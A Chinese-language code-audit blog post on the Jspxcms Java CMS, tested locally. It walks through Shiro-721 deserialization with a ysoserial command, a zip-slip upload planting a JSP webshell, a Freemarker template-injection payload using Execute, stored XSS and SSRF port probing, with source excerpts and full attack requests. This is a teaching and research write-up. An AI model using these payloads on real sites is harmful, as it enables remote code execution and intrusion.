---
created: 2024-10-01T09:24:00+00:00
categories:
  - 技术研究
tags:
  - 代码审计
updated: 2022-08-17T00:00:00+00:00
date: 2022-08-17T00:00:00+00:00
slug: jspxcms-code-audit-learn
title: Jspxcms审计记录
cover: /img/post/jspxcms-code-audit-learn/3.png
id: 112906e1-7468-8092-9d27-cf3078fe8796
---

## 技术栈

该项目使用了 SpringMVC 框架、Spring Data JPA 框架，Hibernate 作为数据库持久化框架，Shiro 作为安全框架，以及 Freemarker 模版引擎。

## 组件依赖

通过观察 Maven 同步的依赖库，发现部分使用的组件和版本如下。

| 组件                | 版本   |
| ------------------- | ------ |
| commons-beanutils   | 1.9.3  |
| commons-collections | 3.2.2  |
| commons-logging     | 1.1.3  |
| freemarker          | 2.3.28 |
| shiro-core          | 1.3.2  |
| hibernate-core      | 5.0.12 |
| log4j               | 1.2.17 |
| snakeyaml           | 1.17   |

## 功能点熟悉

在正式进行审计前，应当对这个 Web 应用的相关功能点了解的足够全面、足够熟悉。

由于该项目是个开源项目，在官网也提供了使用手册，通过查阅文档可以更加全面的了解该应用的所有功能点。当然，也可以在安装该环境后，自行探索相关功能点。

## 默认不安全配置

通过查阅文档发现该应用存在管理后台。

![](/img/post/jspxcms-code-audit-learn/0.png)

管理员账户名为 admin，默认无密码就可以直接登录进去。除此之外，此处的登录功能连验证码都未设置，存在被暴力破解的风险。

## RCE

### Shiro 721 反序列化漏洞

通过如上使用到的依赖组件，可得知使用到了 1.3.2 版本的 Shiro，满足 Padding Oracle Attack 漏洞的条件，且存在 1.9.3 版本的 commons-beanutils，可以直接使用 CommonsBeanutils1 链进行攻击。虽然该漏洞存在，但在实际场景中不太容易复现成功。

首先使用 ysoserial 生成反序列化 payload。

```shell
java -jar ysoserial.jar CommonsBeanutils1 "open -a Calculator" > rce.ser
```

第二步，获取一个有效的 rememberMe。

![](/img/post/jspxcms-code-audit-learn/1.png)

然后通过<https://github.com/wuppp/shiro_rce_exp>这个工具，进行爆破。

```shell
python shiro_exp.py http://127.0.0.1:8088/ tfG3gjvoIwe+kHjzfNRddP9QL7uy2/GeTBASaYZ83WW6vaGZCgUDp2TfrOVBvflVyxuJ+yGzGvyjDcK031vUCzdfadQ6TWIjFrVuRoqCeZdDCwqP7gWSf4HoONl8QGdWsPHH6D4agsz1ZRmWwen5uyzcVpZdjKFzv5117tSHFHPj+hcgmfL0L+v90TKHmgiWLSiEADvbL/qfmCo8HQCYtkK6DxuWQ35IvSoOCRaV5GpeKRlvcJVejGiqKQsx20N12IBKxIQBJ1htcyh3SJic8sQT6anMnNKe/FoRmOTxhbIwnzwCqGrDfJw1otx1YBLJTcfeXDuDk/41eJ3pLQ2VTuPdU/gIu/p8zf/7APjcQDI8C2wljK8zKkn4JwDt1/jb25zxw05FohDyusuQAc+TRBkyM6s1zk7ARDnyG9PQeqUdCxeubu5rbDxFVQM0bTWkL1fnqtt/fciGVU84aonJA2uUYIOI5xrdqUDm1ySOHHZGYWu8l109tt/aIJrdL2xxyK7BL6Ul3Ttd4Nw0SQqO0FaUWV2IO/oBandsk7kavfmdN+LvX30T7iLqIUehhprLChbJX4z8asfm4VRL/dJBzr6Z14U/cW8l90ULB4Z4qU3RbIdl+yiODUUk7exp/exwjeKrdd068p0yTiZYbx+q8BcAgugBILOeS791WJMm2zFwDumcDtOM7S+5BpqRQXUrCwpthYy9drXPpyCrcbkFLRqdArYBWWpwx07VaqmPioCSX7klaicZtH9ho6D4fEWZ/9oWm9Angj6+GaTn0Qlp1g== rce.ser
```

爆破了几个小时后，终于爆出 rememberMe cookies。

![](/img/post/jspxcms-code-audit-learn/2.png)

将如上爆出的 rememberMe cookies 放置在 BurpSuite 中，并发包，可以发现计算机成功弹出。

![](/img/post/jspxcms-code-audit-learn/3.png)

### Zip Slip 任意文件覆盖漏洞

通过[http://127.0.0.1:8088/cmscp/index.do](http://127.0.0.1:8088/cmscp/index.do)，使用 admin 账户加空密码登录进后台，在后台可以发现有相关上传功能。

![](/img/post/jspxcms-code-audit-learn/4.png)

尝试上传一个普通的文本文件，是能正常访问的，但当上传 jsp 后缀时，访问就会 404。

查看上传的文件的目录权限，可发现并无执行权限。

```shell
ls -al src/main/webapp/uploads/1
total 16
drwxr-xr-x  4 r00t  staff  128 Mar 16 12:45 .
drwxrwxr-x  4 r00t  staff  128 Mar 16 12:27 ..
-rw-r--r--  1 r00t  staff  288 Mar 16 12:30 test.jsp
-rw-r--r--  1 r00t  staff    5 Mar 16 12:28 test.txt
```

继续将目光盯向 ZIP 文件上传功能，上传一个压缩包，并抓包。

![](/img/post/jspxcms-code-audit-learn/5.png)

回到网页，可以发现压缩包中的文件被自动解压了。

![](/img/post/jspxcms-code-audit-learn/6.png)

回到 IDEA 中，审计 zip 上传相关方法。

```java
@RequiresPermissions("core:web_file_2:zip_upload")
@RequestMapping("zip_upload.do")
public void zipUpload(@RequestParam(value = "file", required = false) MultipartFile file, String parentId,
		HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra) throws IOException {
	super.zipUpload(file, parentId, request, response, ra);
}
```

跟进`zipUpload`方法，在其中使用到了`AntZipUtils.unzip`方法进行解压缩。

```java
protected void zipUpload(MultipartFile file, String parentId, HttpServletRequest request,
		HttpServletResponse response, RedirectAttributes ra) throws IOException {
	Site site = Context.getCurrentSite();
	FileHandler fileHandler = getFileHandler(site);
	if (!(fileHandler instanceof LocalFileHandler)) {
		throw new CmsException("ftp cannot support ZIP.");
	}
	LocalFileHandler localFileHandler = (LocalFileHandler) fileHandler;
	String base = getBase(site);
	// parentId = parentId == null ? base : parentId;

	if (!Validations.uri(parentId, base)) {
		throw new CmsException("invalidURI");
	}
	File parentFile = localFileHandler.getFile(parentId);
	File tempFile = FilesEx.getTempFile();
	file.transferTo(tempFile);
	AntZipUtils.unzip(tempFile, parentFile);
	tempFile.delete();

	logService.operation("opr.webFile.zipUpload", parentId + "/" + file.getOriginalFilename(), null, null, request);
	logger.info("zip upload file, name={}.", parentId + "/" + file.getOriginalFilename());
	Servlets.writeHtml(response, "true");
}
```

跟进之，如下，可以发现该方法并未对文件名做安全检查，这里可能容易存在 zip 文件任意解压漏洞。

```java
public static void unzip(File zipFile, File destDir, String encoding) {
	if (destDir.exists() && !destDir.isDirectory()) {
		throw new IllegalArgumentException("destDir is not a directory!");
	}
	ZipFile zip = null;
	InputStream is = null;
	FileOutputStream fos = null;
	File file;
	String name;
	byte[] buff = new byte[DEFAULT_BUFFER_SIZE];
	int readed;
	ZipEntry entry;
	try {
		try {
			if (StringUtils.isNotBlank(encoding)) {
				zip = new ZipFile(zipFile, encoding);
			} else {
				zip = new ZipFile(zipFile);
			}
			Enumeration<?> en = zip.getEntries();
			while (en.hasMoreElements()) {
				entry = (ZipEntry) en.nextElement();
				name = entry.getName();
				name = name.replace('/', File.separatorChar);
				file = new File(destDir, name);
				if (entry.isDirectory()) {
					file.mkdirs();
				} else {
					// 创建父目录
					file.getParentFile().mkdirs();
					is = zip.getInputStream(entry);
					fos = new FileOutputStream(file);
					while ((readed = is.read(buff)) > 0) {
						fos.write(buff, 0, readed);
					}
					fos.close();
					is.close();
				}
			}
		} finally {
			if (fos != null) {
				fos.close();
			}
			if (is != null) {
				is.close();
			}
			if (zip != null) {
				zip.close();
			}
		}
	} catch (IOException e) {
		logger.error("", e);
	}
}
```

构造一个恶意的 zip 压缩包。

```shell
zipinfo evilzip.zip
Archive:  evilzip.zip
Zip file size: 561 bytes, number of entries: 2
drwxr-xr-x  2.0 unx        0 bx stor 22-Mar-16 13:13 /
-rw-r--r--  2.0 unx      604 bX defN 22-Mar-16 13:14 ../../rce.jsp
```

然后上传，但是依旧是无法访问，可以发现在访问 jsp 后缀的文件时，会在前面加一个/jsp 前缀。

![](/img/post/jspxcms-code-audit-learn/7.png)

回到 IDAE 中，发现相关过滤器如下。

![](/img/post/jspxcms-code-audit-learn/8.png)

既然如此，那么尝试将 jsp 转成 war，这样的目的是作为一个独立的 web 应用，就不会过如上过滤器了。

```shell
jar -cf rce.war ./rce.jsp
```

然后再此上传，由于此次的环境是通过 IDEA 启动 SpringBoot 的，所以在这种情况下是依旧无法访问 webshell 的。但在实际 tomcat 部署方式中，这种方式肯定是可行的。

![](/img/post/jspxcms-code-audit-learn/9.png)

### Freemarker SSTI

继续翻看后台相关功能，发现一个模版上传的功能，由于该应用使用的是 Freemarker 模板框架，所以此处可能存在模版注入漏洞的。

![](/img/post/jspxcms-code-audit-learn/10.png)

上传一个恶意的模版。

```http
POST /cmscp/core/web_file_1/upload.do?_site=1 HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 496
Accept: text/html, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAZrBHSAhmC9xfoEi
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: open_ids=%2F1%2C%2F1%2Fdefault; select_id=%2F1%2Fm; OFBiz.Visitor=10000; _jspxcms=f1bcdbbcf4bb4413a5630543db361cd4; _site=1; JSESSIONID=1F497CF9E044E65C2DBAAE4ADAF1B2D7
Connection: close

------WebKitFormBoundaryAZrBHSAhmC9xfoEi
Content-Disposition: form-data; name="parentId"

/1/rce
------WebKitFormBoundaryAZrBHSAhmC9xfoEi
Content-Disposition: form-data; name="file"; filename="index.html"
Content-Type: text/html

[#escape a as (a)!?html]
<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
</head>
<body>

${"freemarker.template.utility.Execute"?new()("open -a Calculator")}

</body>
</html>
[/#escape]
------WebKitFormBoundaryAZrBHSAhmC9xfoEi--
```

回到 IDEA 中搜索相关功能点，相关处理方法如下，没有经过任意安全检查便直接写入了。

```java
protected void upload(MultipartFile file, String parentId, HttpServletRequest request, HttpServletResponse response)
		throws IllegalStateException, IOException {
	Site site = Context.getCurrentSite();
	// parentId = parentId == null ? base : parentId;
	String base = getBase(site);
	if (!Validations.uri(parentId, base)) {
		throw new CmsException("invalidURI", parentId);
	}
	FileHandler fileHandler = getFileHandler(site);
	fileHandler.store(file, parentId);
	logService.operation("opr.webFile.upload", parentId + "/" + file.getOriginalFilename(), null, null, request);
	logger.info("upload file, name={}.", parentId + "/" + file.getOriginalFilename());
	Servlets.writeHtml(response, "true");
}
```

在成功上传后，然后去到系统管理-网站设置中，修改模板主题为刚刚上传的恶意模板。

![](/img/post/jspxcms-code-audit-learn/11.png)

最后进行访问便可以触发命令执行。

![](/img/post/jspxcms-code-audit-learn/12.png)

## XSS

寻找到一处评论框，尝试注入 XSS 弹窗 payload，并使用 Burpsuite 拦截请求。

![](/img/post/jspxcms-code-audit-learn/13.png)

通过 HTTP 报文得知，评论内容的参数为`text`。

![](/img/post/jspxcms-code-audit-learn/14.png)

IDEA 中搜索`comment_submit`路由，找到处理逻辑。

![](/img/post/jspxcms-code-audit-learn/15.png)

处理方法如下，`submit`方法未对 text 做任何检查过滤，直接传入`submit`的重载方法中。

```java
@RequestMapping("/comment_submit")
public String submit(String fname, String ftype, Integer fid,
		Integer parentId, String text, String captcha,
		HttpServletRequest request, HttpServletResponse response,
		org.springframework.ui.Model modelMap)
		throws InstantiationException, IllegalAccessException,
		ClassNotFoundException {
	return submit(null, fname, ftype, fid, parentId, text, captcha,
			request, response, modelMap);
}
```

跟进重载方法中，在其中也是对`text`变量进行了非空判断和去敏感词。然后将`text`变量的值赋给 comment 对象中的`text`变量。最后到 205 行的由`CommentService.save`接口实现的`service.save`方法调用 comment 实例。

![](/img/post/jspxcms-code-audit-learn/16.png)

接口`CommentService`的实现类为`CommentServiceImpl`，继续跟进其中的`save`方法。

```java
@Transactional
public Comment save(Comment bean, Integer userId, Integer siteId, Integer parentId) {
	Site site = siteService.get(siteId);
	bean.setSite(site);
	User user = userService.get(userId);
	bean.setCreator(user);
	if (parentId != null) {
		Comment parent = get(parentId);
		bean.setParent(parent);
	}
	if (StringUtils.isNotBlank(bean.getIp())) {
		bean.setCountry(ipSeeker.getCountry(bean.getIp()));
		bean.setArea(ipSeeker.getArea(bean.getIp()));
	}

	bean.applyDefaultValue();
	bean = dao.save(bean);
	dao.flushAndRefresh(bean);
	if (bean.getStatus() == Comment.AUDITED) {
		Object anchor = bean.getAnchor();
		if (anchor instanceof Commentable) {
			((Commentable) anchor).addComments(1);
		}
	}
	return bean;
}
```

在该方法中，也未对`bean`做任何安全处理，最终通过`dao.save`方法保存至数据库。但最后在页面上却没有触发 XSS 弹窗。

![](/img/post/jspxcms-code-audit-learn/17.png)

同时，通过抓包发现，处理评论的是`comment_list`路由，并且 payload 被转义。

![](/img/post/jspxcms-code-audit-learn/18.png)

回到 IDEA 查看处理`comment_list`路由的方法，如下。

```java
@RequestMapping("/comment_list")
public String list(String ftype, Integer fid, Integer page,
		HttpServletRequest request, org.springframework.ui.Model modelMap) {
	return list(null, ftype, fid, page, request, modelMap);
}

@RequestMapping(Constants.SITE_PREFIX_PATH + "/comment_list")
public String list(@PathVariable String siteNumber, String ftype,
		Integer fid, Integer page, HttpServletRequest request,
		org.springframework.ui.Model modelMap) {
	siteResolver.resolveSite(siteNumber);
	Site site = Context.getCurrentSite();
	if (StringUtils.isBlank(ftype)) {
		ftype = "Info";
	}
	if (fid == null) {
		// TODO
	}
	Object bean = service.getEntity(ftype, fid);
	if (bean == null) {
		// TODO
	}
	Anchor anchor = (Anchor) bean;
	// Site site = ((Siteable) bean).getSite();
	String tpl = Servlets.getParam(request, "tpl");
	if (StringUtils.isBlank(tpl)) {
		tpl = "_list";
	}
	modelMap.addAttribute("anchor", anchor);
	Map<String, Object> data = modelMap.asMap();
	ForeContext.setData(data, request);
	ForeContext.setPage(data, page);
	return site.getTemplate(TPL_PREFIX + tpl + TPL_SUFFIX);
}
```

在`list`方法的最后，将`sys_comment_list.html`传入`site.getTemplate`方法中。

而在`sys_comment_list.html`中有使用到 Freemarker 模版引擎中的转义。

```html
[#escape x as (x)!?html]
[#assign commentIndex = 1/]
[#macro printComment parent]
  <div style="background-color:#FFE;border:1px solid #999;padding:3px;">
		[#if parent.parent??]
...
[/#if]
[/#escape]
```

在同级目录下排查不包含转义的 html 文件，结果如下，确定一个与评论有关的 html，即`sys_member_space_comment.html`。

```shell
grep -L "/#escape" *.html
app_info_favorites.html
app_notification.html
inc_js.html
list.html
page.html
sys_member_login_ajax.html
sys_member_space_article.html
sys_member_space_comment.html
sys_operation_error.html
sys_operation_success.html
sys_operation_warning.html
sys_rss.html
```

而在`sys_member_space.html`中又对`sys_member_space_comment.html`进行了包含，需要当 type 请求参数的值为 comment 或 article。

![](/img/post/jspxcms-code-audit-learn/19.png)

继续在 IDEA 中搜索`sys_member_space.html`，发现当请求路径为`/space/{id}`，就会获取`sys_member_space.html`模版，最终成功执行存储性 XSS。

![](/img/post/jspxcms-code-audit-learn/20.png)

![](/img/post/jspxcms-code-audit-learn/21.png)

## SSRF

在审计 SSRF 漏洞前，需要知道 Java 中的一些常见的对外发送请求的方法。

```text
Socket()
OkHttpClient.newCall(request).execute()
ImageIO.read()
HttpClient.execute()
HttpClient.executeMethod()
HttpURLConnection.connect()
HttpURLConnection.getInputStream()
URL.openConnection()
URL.openStream()
HttpServletRequest()
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```

### HttpClient.execute()

在 IDEA 中直接搜索到`httpclient.execute`方法，这个方法实现自 HttpClient 类，发现有个获取 HTML 网页的方法。

![](/img/post/jspxcms-code-audit-learn/22.png)

```java
@Transient
public static String fetchHtml(CloseableHttpClient httpclient, URI uri,
		String charset) throws ClientProtocolException, IOException {
	HttpGet httpget = new HttpGet(uri);
	CloseableHttpResponse response = httpclient.execute(httpget);
	String html = null;
	try {
		if (response.getStatusLine().getStatusCode() == HttpServletResponse.SC_OK) {
			HttpEntity entity = response.getEntity();
			html = EntityUtils.toString(entity, charset);
		}
	} finally {
		response.close();
	}
	return html;
}
```

该方法有被重载方法调用。

```java
@Transient
public static String fetchHtml(URI uri, String charset, String userAgent)
		throws ClientProtocolException, IOException {
	CloseableHttpClient httpclient = HttpClients.custom()
			.setUserAgent(userAgent).build();
	return fetchHtml(httpclient, uri, charset);
}
```

查询该方法有被哪些方法调用，发现一个方法，在其中没有任何安全检查。

![](/img/post/jspxcms-code-audit-learn/23.png)

直接尝试构造请求，结果如下，成功对本地发起 SSRF。

![](/img/post/jspxcms-code-audit-learn/24.png)

### URL.openConnection()

继续搜索相关请求方法，发现存在`openConnection`方法，在如下`ueditorCatchImage`方法中。

```java
protected void ueditorCatchImage(Site site, HttpServletRequest request,
                                 HttpServletResponse response) throws IOException {
    GlobalUpload gu = site.getGlobal().getUpload();
    PublishPoint point = site.getUploadsPublishPoint();
    FileHandler fileHandler = point.getFileHandler(pathResolver);
    String urlPrefix = point.getUrlPrefix();

    StringBuilder result = new StringBuilder("{\"state\": \"SUCCESS\", list: [");
    List<String> urls = new ArrayList<String>();
    List<String> srcs = new ArrayList<String>();

    String[] source = request.getParameterValues("source[]");
    if (source == null) {
        source = new String[0];
    }
    for (int i = 0; i < source.length; i++) {
        String src = source[i];
        String extension = FilenameUtils.getExtension(src);
        // 格式验证
        if (!gu.isExtensionValid(extension, Uploader.IMAGE)) {
            // state = "Extension Invalid";
            continue;
        }
        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
        if (conn.getContentType().indexOf("image") == -1) {
            // state = "ContentType Invalid";
            continue;
        }
        if (conn.getResponseCode() != 200) {
            // state = "Request Error";
            continue;
        }
        String pathname = site.getSiteBase(Uploader.getQuickPathname(Uploader.IMAGE, extension));
        InputStream is = null;
        try {
            is = conn.getInputStream();
            fileHandler.storeFile(is, pathname);
        } finally {
            IOUtils.closeQuietly(is);
        }
        String url = urlPrefix + pathname;
        urls.add(url);
        srcs.add(src);
        result.append("{\"state\": \"SUCCESS\",");
        result.append("\"url\":\"").append(url).append("\",");
        result.append("\"source\":\"").append(src).append("\"},");
    }
    if (result.charAt(result.length() - 1) == ',') {
        result.setLength(result.length() - 1);
    }
    result.append("]}");
    logger.debug(result.toString());
    response.getWriter().print(result.toString());
}
```

查看该方法的使用情况，发现存在两处调用，选择一个前台不用被鉴权的方法进行查看。

![](/img/post/jspxcms-code-audit-learn/25.png)

通过判断逻辑构造请求，可以发现当端口未开放时则返回 500，当端口开放时则返回 SUCCESS。

![](/img/post/jspxcms-code-audit-learn/26.png)